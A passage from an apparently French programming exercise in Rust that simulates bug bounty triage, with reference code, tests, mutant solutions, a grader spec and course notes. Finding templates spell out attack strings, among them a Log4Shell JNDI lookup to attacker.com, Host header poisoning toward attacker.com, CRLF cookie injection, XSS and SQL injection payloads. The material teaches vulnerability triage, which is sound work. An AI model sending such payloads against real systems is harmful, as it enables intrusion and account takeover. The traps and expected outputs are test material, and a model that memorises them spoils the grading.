                "3. Exfiltrate response data to attacker server".to_string(),
            ],
            impact: "Credential theft and sensitive data exfiltration from authenticated users".to_string(),
            remediation: "Whitelist specific trusted origins. Never use reflect with credentials.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-942".to_string(),
        })
    } else {
        None
    }
}

fn analyze_mfa(test_case: &TestCase) -> Option<Finding> {
    let race_condition = test_case.extra.get("race_condition")
        .and_then(|v| v.as_bool()).unwrap_or(false);
    let backup_codes_weak = test_case.extra.get("backup_codes_predictable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if race_condition {
        Some(Finding {
            title: "MFA Bypass via Race Condition".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 6.5,
            description: "Race condition in MFA verification allows bypass by sending multiple requests".to_string(),
            reproduction_steps: vec![
                "1. Intercept MFA verification request".to_string(),
                "2. Send 10+ concurrent requests with different codes".to_string(),
                "3. One request may bypass rate limiting and validation".to_string(),
            ],
            impact: "MFA bypass allowing account access with only password".to_string(),
            remediation: "Implement proper locking mechanism for MFA verification.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-362".to_string(),
        })
    } else if backup_codes_weak {
        Some(Finding {
            title: "Predictable MFA Backup Codes".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 5.9,
            description: "MFA backup codes are generated using predictable patterns".to_string(),
            reproduction_steps: vec![
                "1. Generate multiple sets of backup codes".to_string(),
                "2. Analyze pattern in generated codes".to_string(),
                "3. Predict future backup codes".to_string(),
            ],
            impact: "Attackers can predict backup codes and bypass MFA".to_string(),
            remediation: "Use cryptographically secure random number generator for backup codes.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-330".to_string(),
        })
    } else {
        None
    }
}

fn analyze_password_reset(test_case: &TestCase) -> Option<Finding> {
    let host_header_injection = test_case.extra.get("host_header_vulnerable")
        .and_then(|v| v.as_bool()).unwrap_or(false);
    let token_predictable = test_case.extra.get("token_predictable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if host_header_injection {
        Some(Finding {
            title: "Password Reset Poisoning via Host Header Injection".to_string(),
            severity: "HIGH".to_string(),
            cvss: 7.4,
            description: "Password reset emails use Host header to generate reset links".to_string(),
            reproduction_steps: vec![
                "1. Request password reset for victim email".to_string(),
                "2. Intercept request and change Host header to attacker.com".to_string(),
                "3. Victim receives email with link to attacker.com".to_string(),
                "4. Capture reset token when victim clicks link".to_string(),
            ],
            impact: "Account takeover via stolen password reset tokens".to_string(),
            remediation: "Use a hardcoded domain for password reset links. Validate Host header.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-640".to_string(),
        })
    } else if token_predictable {
        Some(Finding {
            title: "Predictable Password Reset Token".to_string(),
            severity: "HIGH".to_string(),
            cvss: 8.1,
            description: "Password reset tokens are generated using predictable patterns".to_string(),
            reproduction_steps: vec![
                "1. Request multiple password resets".to_string(),
                "2. Analyze token generation pattern".to_string(),
                "3. Predict tokens for other users".to_string(),
            ],
            impact: "Account takeover by predicting reset tokens".to_string(),
            remediation: "Use cryptographically secure random tokens with sufficient entropy.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-640".to_string(),
        })
    } else {
        None
    }
}

fn analyze_log_injection(test_case: &TestCase, input: &BugBountyInput) -> Option<Finding> {
    let log4j_version = test_case.extra.get("log4j_version")
        .and_then(|v| v.as_str()).unwrap_or("");
    let jndi_reachable = test_case.extra.get("jndi_reachable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    // Check for Log4Shell (CVE-2021-44228)
    if is_vulnerable_log4j(log4j_version) && jndi_reachable {
        Some(Finding {
            title: "Log4Shell (CVE-2021-44228) - Remote Code Execution".to_string(),
            severity: "CRITICAL".to_string(),
            cvss: 10.0,
            description: "Application uses vulnerable Log4j version allowing JNDI injection".to_string(),
            reproduction_steps: vec![
                "1. Identify logging injection point (User-Agent, X-Forwarded-For)".to_string(),
                "2. Start LDAP server with malicious payload".to_string(),
                "3. Send: ${jndi:ldap://attacker.com/exploit}".to_string(),
                "4. Server fetches and executes malicious class".to_string(),
            ],
            impact: "Remote Code Execution with application privileges".to_string(),
            remediation: "Upgrade Log4j to 2.17.0+. Set log4j2.formatMsgNoLookups=true.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-502".to_string(),
        })
    } else {
        None
    }
}

fn is_vulnerable_log4j(version: &str) -> bool {
    // Versions 2.0-beta9 to 2.14.1 are vulnerable
    if version.is_empty() { return false; }
    let vulnerable_versions = ["2.0", "2.1", "2.2", "2.3", "2.4", "2.5", "2.6", "2.7",
                               "2.8", "2.9", "2.10", "2.11", "2.12", "2.13", "2.14"];
    vulnerable_versions.iter().any(|v| version.starts_with(v))
}

fn analyze_crlf(test_case: &TestCase) -> Option<Finding> {
    let injectable = test_case.extra.get("crlf_injectable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if injectable {
        Some(Finding {
            title: "CRLF Injection / HTTP Response Splitting".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 5.4,
            description: "Application reflects user input in HTTP headers without sanitization".to_string(),
            reproduction_steps: vec![
                "1. Find parameter reflected in response headers".to_string(),
                "2. Inject: %0d%0aSet-Cookie: evil=value".to_string(),
                "3. Observe injected header in response".to_string(),
            ],
            impact: "Session fixation, cache poisoning, XSS via injected headers".to_string(),
            remediation: "Sanitize CRLF characters from user input used in headers.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-113".to_string(),
        })
    } else {
        None
    }
}

fn analyze_xss(test_case: &TestCase) -> Option<Finding> {
    let xss_type = test_case.extra.get("xss_type")
        .and_then(|v| v.as_str()).unwrap_or("");

    if !xss_type.is_empty() {
        let (severity, cvss) = match xss_type {
            "stored" => ("HIGH", 8.1),
            "reflected" => ("MEDIUM", 6.1),
            "dom" => ("MEDIUM", 6.1),
            _ => ("LOW", 4.3),
        };

        Some(Finding {
            title: format!("{} Cross-Site Scripting (XSS)", capitalize(xss_type)),
            severity: severity.to_string(),
            cvss,
            description: format!("{} XSS vulnerability allows script injection", capitalize(xss_type)),
            reproduction_steps: vec![
                "1. Navigate to vulnerable endpoint".to_string(),
                format!("2. Inject payload: <script>alert(1)</script>"),
                "3. Observe script execution".to_string(),
            ],
            impact: "Session hijacking, credential theft, defacement".to_string(),
            remediation: "Implement context-aware output encoding. Use CSP.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-79".to_string(),
        })
    } else {
        None
    }
}

fn analyze_sqli(test_case: &TestCase) -> Option<Finding> {
    let vulnerable = test_case.extra.get("vulnerable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if vulnerable {
        Some(Finding {
            title: "SQL Injection".to_string(),
            severity: "CRITICAL".to_string(),
            cvss: 9.8,
            description: "SQL injection vulnerability allows database manipulation".to_string(),
            reproduction_steps: vec![
                "1. Identify injection point".to_string(),
                "2. Test with: ' OR '1'='1".to_string(),
                "3. Extract data using UNION-based or blind techniques".to_string(),
            ],
            impact: "Data breach, authentication bypass, potential RCE".to_string(),
            remediation: "Use parameterized queries. Implement input validation.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-89".to_string(),
        })
    } else {
        None
    }
}

fn analyze_serverless(test_case: &TestCase) -> Option<Finding> {
    let env_exposed = test_case.extra.get("env_variables_exposed")
        .and_then(|v| v.as_bool()).unwrap_or(false);
    let timeout_exploitable = test_case.extra.get("timeout_exploitable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if env_exposed {
        Some(Finding {
            title: "Serverless Function Environment Variable Exposure".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 6.5,
            description: "Lambda/Cloud Function exposes environment variables including secrets".to_string(),
            reproduction_steps: vec![
                "1. Trigger error condition in function".to_string(),
                "2. Error response includes environment dump".to_string(),
                "3. Extract AWS keys, database credentials, etc.".to_string(),
            ],
            impact: "Credential leakage, lateral movement to other services".to_string(),
            remediation: "Use secrets manager. Never expose errors with env details.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-215".to_string(),
        })
    } else {
        None
    }
}

fn analyze_wasm(test_case: &TestCase) -> Option<Finding> {
    let memory_exposed = test_case.extra.get("linear_memory_exposed")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if memory_exposed {
        Some(Finding {
            title: "WebAssembly Linear Memory Exposure".to_string(),
            severity: "LOW".to_string(),
            cvss: 4.3,
            description: "WASM module exposes linear memory to JavaScript without proper bounds".to_string(),
            reproduction_steps: vec![
                "1. Access WASM module's memory from JS".to_string(),
                "2. Read beyond intended boundaries".to_string(),
                "3. Extract sensitive data from memory".to_string(),
            ],
            impact: "Information disclosure, potential memory corruption".to_string(),
            remediation: "Implement proper memory bounds checking. Minimize JS-WASM interface.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-119".to_string(),
        })
    } else {
        None
    }
}

fn analyze_info_disclosure(test_case: &TestCase) -> Option<Finding> {
    Some(Finding {
        title: "Information Disclosure".to_string(),
        severity: "LOW".to_string(),
        cvss: 3.1,
        description: "Application exposes sensitive information".to_string(),
        reproduction_steps: vec![
            "1. Access the vulnerable endpoint".to_string(),
            "2. Observe disclosed information".to_string(),
        ],
        impact: "Information leakage aiding further attacks".to_string(),
        remediation: "Remove sensitive information from responses.".to_string(),
        chain: None,
        is_duplicate: false,
        cwe: "CWE-200".to_string(),
    })
}

fn analyze_application_info(app_info: &ApplicationInfo, scope: &TargetScope) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check for known vulnerable components
    for tech in &app_info.tech_stack {
        if tech.contains("Log4j 2.14") || tech.contains("Log4j 2.13") {
            findings.push(Finding {
                title: "Vulnerable Log4j Version Detected".to_string(),
                severity: "CRITICAL".to_string(),
                cvss: 10.0,
                description: format!("Tech stack includes vulnerable {}", tech),
                reproduction_steps: vec!["See Log4Shell exploitation steps".to_string()],
                impact: "Remote Code Execution".to_string(),
                remediation: "Upgrade to Log4j 2.17.0+".to_string(),
                chain: None,
                is_duplicate: false,
                cwe: "CWE-502".to_string(),
            });
        }
    }

    findings
}

fn detect_chains(findings: &[Finding]) -> Vec<VulnerabilityChain> {
    let mut chains = Vec::new();

    // Look for XSS that can be chained
    let has_xss = findings.iter().any(|f| f.cwe == "CWE-79");
    let has_csrf = findings.iter().any(|f| f.title.contains("CSRF"));
    let has_session = findings.iter().any(|f| f.title.contains("Session") || f.title.contains("Cookie"));

    if has_xss {
        chains.push(VulnerabilityChain {
            chain_type: "xss_chain".to_string(),
            steps: vec![
                "XSS payload injection".to_string(),
                "Session cookie theft".to_string(),
                "Account takeover".to_string(),
            ],
            combined_impact: "Full account compromise via XSS".to_string(),
            combined_cvss: 8.5,
        });
    }

    // SAML + Privilege Escalation chain
    let has_saml = findings.iter().any(|f| f.title.contains("SAML"));
    if has_saml {
        chains.push(VulnerabilityChain {
            chain_type: "auth_bypass_chain".to_string(),
            steps: vec![
                "SAML signature bypass".to_string(),
                "Forge admin assertion".to_string(),
                "Administrative access".to_string(),
            ],
            combined_impact: "Full administrative access".to_string(),
            combined_cvss: 9.8,
        });
    }

    chains
}

fn calculate_bounty(findings: &[Finding], bounty_program: &Option<BountyProgram>) -> u32 {
    let default_ranges = BountyProgram {
        critical: BountyRange { min: 5000, max: 15000 },
        high: BountyRange { min: 2000, max: 5000 },
        medium: BountyRange { min: 500, max: 2000 },
        low: BountyRange { min: 100, max: 500 },
    };

    let ranges = bounty_program.as_ref().unwrap_or(&default_ranges);
    let mut total = 0u32;

    for finding in findings {
        if finding.is_duplicate {
            continue;
        }
        let range = match finding.severity.as_str() {
            "CRITICAL" => &ranges.critical,
            "HIGH" => &ranges.high,
            "MEDIUM" => &ranges.medium,
            "LOW" => &ranges.low,
            _ => &ranges.low,
        };
        // Use midpoint of range
        total += (range.min + range.max) / 2;
    }

    total
}

fn capitalize(s: &str) -> String {
    let mut chars = s.chars();
    match chars.next() {
        None => String::new(),
        Some(c) => c.to_uppercase().collect::<String>() + chars.as_str(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_saml_bypass_detection() {
        let input = r#"{"target_scope":{"domains":["*.test.com"],"out_of_scope":[]},"test_cases":[{"id":"1","type":"saml_analysis","saml_response":{"signature_validated":false}}]}"#;
        let result: Value = serde_json::from_str(&bug_bounty_simulation(input)).unwrap();
        assert_eq!(result["findings"][0]["severity"], "CRITICAL");
    }

    #[test]
    fn test_out_of_scope() {
        let input = r#"{"target_scope":{"domains":["*.test.com"],"out_of_scope":["blog.test.com"]},"test_cases":[{"id":"1","type":"xss_analysis","endpoint":"https://blog.test.com/search","xss_type":"reflected"}]}"#;
        let result: Value = serde_json::from_str(&bug_bounty_simulation(input)).unwrap();
        assert_eq!(result["findings"].as_array().unwrap().len(), 0);
    }
}
```

### 4.4 Solutions alternatives accept√©es

```rust
// Alternative 1: Approche avec pattern matching exhaustif
fn analyze_test_case_v2(test_case: &TestCase, input: &BugBountyInput) -> Option<Finding> {
    let analyzers: HashMap<&str, fn(&TestCase, &BugBountyInput) -> Option<Finding>> = HashMap::from([
        ("saml_analysis", analyze_saml as fn(&TestCase, &BugBountyInput) -> Option<Finding>),
        ("websocket_analysis", |tc, _| analyze_websocket(tc)),
        // ... autres analyseurs
    ]);

    analyzers.get(test_case.test_type.as_str())
        .and_then(|f| f(test_case, input))
}

// Alternative 2: Builder pattern pour les findings
struct FindingBuilder {
    title: Option<String>,
    severity: Option<String>,
    cvss: Option<f64>,
    // ...
}

impl FindingBuilder {
    fn new() -> Self { /* ... */ }
    fn title(mut self, t: &str) -> Self { self.title = Some(t.to_string()); self }
    fn severity(mut self, s: &str) -> Self { self.severity = Some(s.to_string()); self }
    fn build(self) -> Result<Finding, &'static str> { /* ... */ }
}
```

### 4.5 Solutions refus√©es (avec explications)

```rust
// ‚ùå REFUS√â: Pas de v√©rification du scope
fn bad_analyze_no_scope_check(test_cases: &[TestCase]) -> Vec<Finding> {
    // ERREUR: Analyse tous les test cases sans v√©rifier le scope
    test_cases.iter()
        .filter_map(|tc| analyze_test_case_basic(tc))
        .collect()
    // Pourquoi c'est faux: Les targets out-of-scope ne doivent jamais √™tre test√©es
}

// ‚ùå REFUS√â: CVSS hardcod√© sans calcul
fn bad_fixed_cvss() -> Finding {
    Finding {
        cvss: 9.8, // ERREUR: Toujours CRITICAL
        // Le CVSS doit √™tre calcul√© selon le type de vuln√©rabilit√©
        ..Default::default()
    }
}

// ‚ùå REFUS√â: Pas de d√©tection de duplicates
fn bad_no_duplicate_check(findings: Vec<Finding>) -> Vec<Finding> {
    findings // ERREUR: Retourne tous les findings sans v√©rifier les duplicates
}
```

### 4.6 Solution bonus de r√©f√©rence (COMPL√àTE)

```rust
// Solution bonus avec ML-like pattern learning
pub fn bug_bounty_simulation_ml(input_json: &str, training_data: &str) -> String {
    let input: BugBountyInput = serde_json::from_str(input_json).unwrap();
    let patterns: Vec<VulnPattern> = serde_json::from_str(training_data).unwrap_or_default();

    let mut findings = Vec::new();
    let mut learned_patterns: HashMap<String, f64> = HashMap::new();

    // Learn from training data
    for pattern in &patterns {
        let key = format!("{}:{}", pattern.vuln_type, pattern.context);
        *learned_patterns.entry(key).or_insert(0.0) += pattern.confidence;
    }

    // Apply learned patterns
    for test_case in &input.test_cases {
        let predicted_vulns = predict_vulnerabilities(&test_case, &learned_patterns);
        for (vuln_type, confidence) in predicted_vulns {
            if confidence > 0.7 {
                if let Some(finding) = create_finding_from_prediction(&vuln_type, confidence) {
                    findings.push(finding);
                }
            }
        }
    }

    // Auto-chain discovery using graph
    let chains = discover_chains_graph(&findings);

    serde_json::to_string_pretty(&BugBountyMLOutput {
        findings,
        chains,
        model_confidence: calculate_model_confidence(&learned_patterns),
        predictions: generate_predictions(&input, &learned_patterns),
    }).unwrap()
}

#[derive(Deserialize)]
struct VulnPattern {
    vuln_type: String,
    context: String,
    confidence: f64,
}

fn predict_vulnerabilities(tc: &TestCase, patterns: &HashMap<String, f64>) -> Vec<(String, f64)> {
    let mut predictions = Vec::new();
    for (pattern, confidence) in patterns {
        if pattern.contains(&tc.test_type) {
            predictions.push((pattern.clone(), *confidence));
        }
    }
    predictions.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap());
    predictions
}
```

### 4.10 Solutions Mutantes (6 mutants)

```rust
// Mutant A (Boundary): Off-by-one dans le calcul CVSS
fn mutant_boundary_cvss(severity: &str) -> f64 {
    match severity {
        "CRITICAL" => 9.9, // ERREUR: Devrait √™tre 9.0-10.0 range
        "HIGH" => 7.9,      // ERREUR: Devrait √™tre 7.0-8.9
        "MEDIUM" => 4.9,    // ERREUR: Devrait √™tre 4.0-6.9
        "LOW" => 0.0,       // ERREUR: Devrait √™tre 0.1-3.9
        _ => 0.0,
    }
    // Bug: Les bornes sont incorrectes, causant des scores invalides
}

// Mutant B (Safety): Pas de v√©rification NULL/empty
fn mutant_safety_no_check(input_json: &str) -> String {
    let input: BugBountyInput = serde_json::from_str(input_json).unwrap(); // CRASH si invalide
    // ERREUR: Pas de gestion d'erreur, panic sur JSON invalide
    process_input(&input)
}

// Mutant C (Resource): Fuite de m√©moire avec accumulation infinie
fn mutant_resource_leak(findings: &mut Vec<Finding>, new_finding: Finding) {
    findings.push(new_finding);
    findings.push(new_finding.clone()); // ERREUR: Double ajout
    // Bug: Chaque finding est ajout√© deux fois, croissance m√©moire x2
}

// Mutant D (Logic): Logique invers√©e pour out-of-scope
fn mutant_logic_inverted_scope(endpoint: &str, out_of_scope: &[String]) -> bool {
    for oos in out_of_scope {
        if endpoint.contains(oos) {
            return false; // ERREUR: Devrait retourner true (IS out of scope)
        }
    }
    true // ERREUR: Devrait retourner false (is NOT out of scope)
    // Bug: La logique est compl√®tement invers√©e
}

// Mutant E (Return): Retourne toujours un tableau vide
fn mutant_return_empty(input: &BugBountyInput) -> Vec<Finding> {
    let _findings = analyze_all_cases(input);
    Vec::new() // ERREUR: Retourne toujours vide au lieu des findings
    // Bug: Tous les findings sont perdus
}

// Mutant F (Edge Case): Ne g√®re pas les domaines wildcard
fn mutant_edge_wildcard(domain: &str, scope_domains: &[String]) -> bool {
    scope_domains.contains(&domain.to_string())
    // ERREUR: "api.target.com" ne match pas "*.target.com"
    // Bug: Les wildcards ne sont pas interpr√©t√©s
}
```

### 4.9 spec.json (ENGINE v22.1)

```json
{
  "name": "bug_bounty_simulation",
  "language": "rust",
  "version": "edition 2024",
  "type": "complet_2",
  "tier": 3,
  "tier_info": "Synth√®se (tous concepts du module)",
  "tags": ["bug-bounty", "web-security", "pentesting", "phase3", "synthesis"],
  "passing_score": 70,

  "function": {
    "name": "bug_bounty_simulation",
    "prototype": "pub fn bug_bounty_simulation(input_json: &str) -> String",
    "return_type": "String",
    "parameters": [
      {"name": "input_json", "type": "&str"}
    ]
  },

  "driver": {
    "reference": "pub fn ref_bug_bounty_simulation(input_json: &str) -> String { let input: BugBountyInput = serde_json::from_str(input_json).unwrap_or_default(); let mut findings = Vec::new(); for tc in &input.test_cases { if !is_out_of_scope(&tc.endpoint, &input.target_scope.out_of_scope) { if let Some(f) = analyze_test_case(&tc) { findings.push(f); } } } serde_json::to_string(&BugBountyOutput { findings, ..Default::default() }).unwrap() }",

    "edge_cases": [
      {
        "name": "saml_signature_bypass",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"saml_analysis\",\"saml_response\":{\"signature_validated\":false}}]}"],
        "expected_contains": "CRITICAL",
        "is_trap": true,
        "trap_explanation": "SAML sans validation de signature = CRITICAL obligatoire"
      },
      {
        "name": "websocket_xss_chain",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"websocket_analysis\",\"message_sanitization\":false,\"stored_messages\":true}]}"],
        "expected_contains": "xss_chain",
        "is_trap": true,
        "trap_explanation": "WebSocket non sanitis√© + stock√© = chain XSS obligatoire"
      },
      {
        "name": "out_of_scope_ignored",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[\"blog.target.com\"]},\"test_cases\":[{\"id\":\"1\",\"type\":\"sqli_analysis\",\"endpoint\":\"https://blog.target.com/search\",\"vulnerable\":true}]}"],
        "expected": "{\"findings\":[]}",
        "is_trap": true,
        "trap_explanation": "Les targets out-of-scope doivent √™tre ignor√©es"
      },
      {
        "name": "cors_with_credentials",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"cors_analysis\",\"cors_config\":{\"allow_origin\":\"reflect\",\"allow_credentials\":true}}]}"],
        "expected_contains": "HIGH",
        "is_trap": false
      },
      {
        "name": "log4shell_detection",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"application_info\":{\"tech_stack\":[\"Log4j 2.14.1\"]},\"test_cases\":[{\"id\":\"1\",\"type\":\"log_injection_analysis\",\"log4j_version\":\"2.14.1\",\"jndi_reachable\":true}]}"],
        "expected_contains": "CRITICAL",
        "is_trap": true,
        "trap_explanation": "Log4j vuln√©rable + JNDI accessible = CRITICAL (CVE-2021-44228)"
      },
      {
        "name": "duplicate_detection",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"xss_analysis\",\"endpoint\":\"/search\",\"xss_type\":\"reflected\"},{\"id\":\"2\",\"type\":\"xss_analysis\",\"endpoint\":\"/search\",\"xss_type\":\"reflected\"}]}"],
        "expected_contains": "is_duplicate",
        "is_trap": true,
        "trap_explanation": "M√™me vuln√©rabilit√© sur m√™me endpoint = duplicate"
      },
      {
        "name": "empty_input",
        "args": ["{\"target_scope\":{\"domains\":[],\"out_of_scope\":[]},\"test_cases\":[]}"],
        "expected_contains": "findings",
        "is_trap": true,
        "trap_explanation": "Input vide doit retourner structure valide avec findings vide"
      },
      {
        "name": "invalid_json",
        "args": ["{invalid json}"],
        "expected_contains": "error",
        "is_trap": true,
        "trap_explanation": "JSON invalide doit retourner erreur propre, pas panic"
      }
    ],

    "fuzzing": {
      "enabled": true,
      "iterations": 500,
      "generators": [
        {
          "type": "object",
          "param_index": 0,
          "params": {
            "schema": "BugBountyInput",
            "randomize_test_cases": true,
            "max_test_cases": 20
          }
        }
      ]
    }
  },

  "norm": {
    "allowed_functions": ["serde_json::*", "std::collections::*", "regex::*"],
    "forbidden_functions": ["std::net::*", "std::fs::*", "reqwest::*"],
    "check_security": true,
    "check_memory": true,
    "blocking": true
  }
}
```

---

## üß† SECTION 5 : COMPRENDRE (DOCUMENT DE COURS COMPLET)

### 5.1 Ce que cet exercice enseigne

Cet exercice de synth√®se couvre **18 concepts** de s√©curit√© web dans une simulation r√©aliste de bug bounty :

| Domaine | Concepts | Impact |
|---------|----------|--------|
| **Authentification** | SAML, MFA Bypass, Password Reset | Account Takeover |
| **Injection** | Log4Shell, CRLF, XSS | RCE, Data Breach |
| **Configuration** | CORS, WebSocket, Serverless | Data Exfiltration |
| **Architecture** | WASM, Insecure Design | Multiple |

### 5.2 LDA ‚Äî Traduction litt√©rale en fran√ßais (MAJUSCULES)

```
FONCTION bug_bounty_simulation QUI RETOURNE UNE CHA√éNE ET PREND EN PARAM√àTRE input_json QUI EST UNE R√âF√âRENCE VERS UNE CHA√éNE
D√âBUT FONCTION
    D√âCLARER input COMME STRUCTURE BugBountyInput
    AFFECTER LE R√âSULTAT DE PARSER input_json EN JSON √Ä input
    SI ERREUR DE PARSING ALORS
        RETOURNER UN JSON D'ERREUR
    FIN SI

    D√âCLARER findings COMME VECTEUR DE Finding VIDE
    D√âCLARER seen_vulns COMME ENSEMBLE DE CHA√éNES VIDE
    D√âCLARER out_of_scope_count COMME ENTIER √âGAL √Ä 0

    POUR CHAQUE test_case DANS input.test_cases FAIRE
        SI L'ENDPOINT DE test_case EST DANS out_of_scope ALORS
            INCR√âMENTER out_of_scope_count
            CONTINUER √Ä L'IT√âRATION SUIVANTE
        FIN SI

        D√âCLARER finding COMME R√âSULTAT DE analyze_test_case(test_case)
        SI finding EXISTE ALORS
            D√âCLARER vuln_hash COMME CONCAT√âNATION DE finding.title ET endpoint
            SI vuln_hash EST DANS seen_vulns ALORS
                MARQUER finding COMME DUPLICATE
            SINON
                AJOUTER vuln_hash √Ä seen_vulns
            FIN SI
            AJOUTER finding √Ä findings
        FIN SI
    FIN POUR

    TRIER findings PAR CVSS D√âCROISSANT
    D√âCLARER chains COMME R√âSULTAT DE detect_chains(findings)
    D√âCLARER bounty COMME R√âSULTAT DE calculate_bounty(findings)

    RETOURNER LA STRUCTURE BugBountyOutput S√âRIALIS√âE EN JSON
FIN FONCTION
```

### 5.2.2 Logic Flow (Structured English)

```
ALGORITHME : Bug Bounty Simulation
---
1. PARSER l'entr√©e JSON en structure BugBountyInput
   - Si erreur ‚Üí RETOURNER message d'erreur JSON

2. INITIALISER collections :
   - findings = []
   - seen_vulns = Set()
   - chains = []

3. POUR CHAQUE test_case :
   a. V√âRIFIER si endpoint est in-scope
      - Si out-of-scope ‚Üí SKIP et incr√©menter compteur

   b. ANALYSER selon le type :
      - "saml_analysis" ‚Üí check_saml_vulnerabilities()
      - "websocket_analysis" ‚Üí check_websocket_vulnerabilities()
      - "cors_analysis" ‚Üí check_cors_misconfiguration()
      - "log_injection" ‚Üí check_log4shell()
      - ... autres analyseurs

   c. SI vuln√©rabilit√© trouv√©e :
      - CALCULER hash unique (title + endpoint)
      - SI hash existe ‚Üí marquer comme duplicate
      - AJOUTER √† findings

4. POST-TRAITEMENT :
   a. TRIER findings par CVSS d√©croissant
   b. D√âTECTER chains (XSS‚ÜíSession, SAML‚ÜíAdmin)
   c. CALCULER bounty estim√©

5. G√âN√âRER rapport avec toutes les sections

6. RETOURNER JSON structur√©
```

### 5.2.3 Repr√©sentation Algorithmique (Logique de Garde)

```
FONCTION : analyze_test_case (test_case)
---
INIT result = None

1. GUARD: V√©rifier type de test valide
   |
   |-- SI type inconnu :
   |     RETOURNER None
   |
   |-- SELON type :
   |
   |     CAS "saml_analysis" :
   |     |-- V√âRIFIER signature_validated
   |     |     SI false ‚Üí CR√âER finding CRITICAL (CVSS 9.8)
   |     |-- V√âRIFIER claims_modifiable
   |     |     SI true ‚Üí CR√âER finding CRITICAL
   |     |-- RETOURNER finding ou None
   |
   |     CAS "cors_analysis" :
   |     |-- EXTRAIRE cors_config
   |     |-- GUARD: allow_origin == "reflect" ET allow_credentials == true
   |     |     SI true ‚Üí CR√âER finding HIGH (CVSS 7.5)
   |     |-- RETOURNER finding ou None
   |
   |     CAS "log_injection_analysis" :
   |     |-- V√âRIFIER log4j_version vuln√©rable (2.0-2.14.x)
   |     |-- V√âRIFIER jndi_reachable
   |     |     SI les deux ‚Üí CR√âER finding CRITICAL (CVSS 10.0)
   |     |-- RETOURNER finding ou None

2. RETOURNER result
```

### 5.2.3.1 Diagramme Mermaid (Flow Principal)

```mermaid
graph TD
    A[D√©but: bug_bounty_simulation] --> B{JSON valide ?}
    B -- Non --> C[Retourner erreur]
    B -- Oui --> D[Parser en BugBountyInput]

    D --> E[Pour chaque test_case]
    E --> F{Endpoint in-scope ?}

    F -- Non --> G[Skip + compteur++]
    G --> E

    F -- Oui --> H[analyze_test_case]
    H --> I{Finding trouv√© ?}

    I -- Non --> E
    I -- Oui --> J{D√©j√† vu ?}

    J -- Oui --> K[Marquer duplicate]
    J -- Non --> L[Ajouter au set]

    K --> M[Ajouter aux findings]
    L --> M
    M --> E

    E -- Fin boucle --> N[Trier par CVSS]
    N --> O[D√©tecter chains]
    O --> P[Calculer bounty]
    P --> Q[G√©n√©rer rapport]
    Q --> R[Retourner JSON]
```

### 5.3 Visualisation ASCII

```
                    BUG BOUNTY SIMULATION FLOW
    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
    ‚îÇ                                                             ‚îÇ
    ‚îÇ  INPUT                           PROCESSING                 ‚îÇ
    ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê            ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê‚îÇ
    ‚îÇ  ‚îÇ Target Scope    ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Scope Filter            ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚Ä¢ domains: [*]  ‚îÇ            ‚îÇ ‚îú‚îÄ in_scope? ‚úì          ‚îÇ‚îÇ
